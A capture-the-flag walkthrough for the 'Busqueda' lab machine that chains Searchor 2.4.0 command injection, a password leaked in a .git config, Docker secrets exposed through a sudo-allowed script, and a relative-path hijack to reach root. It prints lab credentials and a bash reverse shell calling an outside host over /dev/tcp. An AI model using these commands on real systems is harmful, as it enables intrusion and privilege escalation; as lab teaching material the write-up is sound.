# Busqueda

<div class="wu-meta" markdown="span">
<span class="wu-badge wu-os">:fontawesome-brands-linux: Linux</span>
<span class="wu-badge wu-diff wu-diff--easy">Easy</span>
<span class="wu-tags">
<span class="wu-tag">Searchor RCE</span>
<span class="wu-tag">Git config leak</span>
<span class="wu-tag">Docker secrets</span>
<span class="wu-tag">sudo script abuse</span>
</span>
</div>

!!! abstract "What this box demonstrates"
    Busqueda rewards reading source and chaining small misconfigurations. The web app is built on a vulnerable Searchor release whose search feature evaluates attacker input, giving code execution as a service account. A password sitting in a world-readable `.git` config unlocks SSH, and a root-run `system-checkup.py` — permitted through a sloppy sudo wildcard — both leaks the secrets of a Gitea Docker container and executes a relative-path script you control, which is enough to reach root.

## Attack path

1. Exploit Searchor 2.4.0 command injection on `searcher.htb` for a shell as `svc`, then reuse a password from `/var/www/app/.git/config` to SSH in.
2. Use the sudo-allowed `system-checkup.py` to inspect the Gitea container and recover the Gitea admin / database password.
3. Log into Gitea, read the script's source, and abuse its relative-path `full-checkup.sh` call to run a reverse shell as root.

**Tools:** nmap, curl, git, docker, jq, netcat.

## Enumeration

Set the target and scan:

```bash
IP=10.10.11.208

ports=$(nmap -p- --min-rate=1000 -T4 -n --open $IP | grep '^[0-9]' | cut -d '/' -f 1 | tr '\n' ',' | sed 's/,$//') && echo $ports
sudo nmap -p$ports -sC -sV $IP -oA scan_tcp
```

### Nmap results

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.52
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

<figure class="wu-evidence" markdown>
![The Nmap scan for Busqueda identifies OpenSSH on port 22 and Apache on port 80.](../assets/images/machines/busqueda-nmap.png)
<figcaption>The small attack surface narrows the initial investigation to the web application on port 80.</figcaption>
</figure>

Only SSH and HTTP. Port 80 redirects to `searcher.htb`, so add it to `/etc/hosts`:

```bash
echo "10.10.11.208 searcher.htb" | sudo tee -a /etc/hosts
```

## Foothold

The site is "Searcher," a front end that builds search-engine queries and redirects you to the results. The footer gives away the version: **Searchor 2.4.0**.

That release passes user input into an `eval()` call while building the query URL, so it is vulnerable to arbitrary command injection. A public PoC ([nikn0laty/Exploit-for-Searchor-2.4.0](https://github.com/nikn0laty/Exploit-for-Searchor-2.4.0-Arbitrary-CMD-Injection)) automates the reverse shell:

```bash
nc -lvnp 9001
./exploit.sh searcher.htb 10.10.14.16
```

The listener catches a shell as `svc`. Enumerating the web root turns up a credential pair in the application's Git config:

```bash
cat /var/www/app/.git/config
# ...
# https://cody:jh1usoih2bkjaspwe92@gitea.searcher.htb
```

The same password is reused for the `svc` account, so trade the unstable web shell for SSH and collect the user flag:

```bash
ssh svc@10.10.11.208
```

## Privilege escalation

`sudo -l` shows one entry, and the wildcard at the end is the whole box:

```
User svc may run the following commands on busqueda:
    (root) /usr/bin/python3 /opt/scripts/system-checkup.py *
```

Running it with any argument prints its usage and three actions:

```bash
sudo /usr/bin/python3 /opt/scripts/system-checkup.py x
#   docker-ps      : List running docker containers
#   docker-inspect : Inspect a certain docker container
#   full-checkup   : Run a full system checkup
```

`docker-ps` reveals a Gitea container and a MySQL container backing it:

```
CONTAINER ID   IMAGE               NAMES
960873171e2e   gitea/gitea:latest  gitea
f84a6b33fb5a   mysql:8             mysql_db
```

<figure class="wu-evidence" markdown>
![The privileged system-checkup script lists Gitea and MySQL Docker containers.](../assets/images/machines/busqueda-docker-services.png)
<figcaption>The sudo-enabled helper confirms that Gitea and MySQL are running as containers, exposing the next source of credentials.</figcaption>
</figure>

`docker-inspect` takes a format string and a container, so pull the full config of the Gitea container as JSON and read its environment:

```bash
sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect --format='{{json .Config}}' 960873171e2e | jq .
```

```json
"Env": [
  "USER_UID=115",
  "USER_GID=121",
  "GITEA__database__DB_TYPE=mysql",
  "GITEA__database__HOST=db:3306",
  "GITEA__database__NAME=gitea",
  "GITEA__database__USER=gitea",
  "GITEA__database__PASSWD=yuiu1hoiu4i5ho1uh"
]
```

That password logs into Gitea as `administrator`:

```
administrator:yuiu1hoiu4i5ho1uh
```

Inside Gitea, the `scripts` repository holds the source of `system-checkup.py`. The `full-checkup` action is the weak point — it invokes the helper by a **relative** path:

```python
elif action == 'full-checkup':
    arg_list = ['./full-checkup.sh']
    print(run_command(arg_list))
```

Because the script is run as root but resolves `./full-checkup.sh` from the current directory, drop a malicious `full-checkup.sh` in a directory you control and call the action from there:

```bash
cd /tmp
cat > full-checkup.sh <<'EOF'
#!/bin/bash
bash -c 'bash -i >& /dev/tcp/10.10.14.16/9001 0>&1'
EOF
chmod +x full-checkup.sh

nc -lvnp 9001   # in another terminal
sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup
```

The listener returns a root shell.
